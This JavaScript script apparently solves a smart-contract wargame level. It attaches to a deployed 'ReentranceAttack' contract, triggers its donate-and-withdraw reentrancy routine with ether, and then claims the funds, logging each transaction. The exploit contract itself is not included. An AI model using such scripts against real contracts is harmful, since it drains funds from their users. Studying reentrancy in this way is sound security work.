const { assert } = require("chai");

async function main() {
    
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // Deploy
    hack_contract = await ethers.getContractFactory("ReentranceAttack");
    hack = await hack_contract.attach("0x2b63F86bb3071478335C75166a4FBda572544F57");

    // tx = await hack.call({value: ethers.utils.parseEther("0.0001")});
    tx = await hack.donateAndWithdraw({value: ethers.utils.parseEther("0.02")});
    console.log("================== tx ===================");
    console.log(tx);

    receipt = await tx.wait();
    console.log("================== receipt ===================");
    console.log(receipt);


    tx = await hack.claim(ethers.utils.parseEther("0.02"));
    console.log("================== tx ===================");
    console.log(tx);

    receipt = await tx.wait();
    console.log("================== receipt ===================");
    console.log(receipt);
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
});
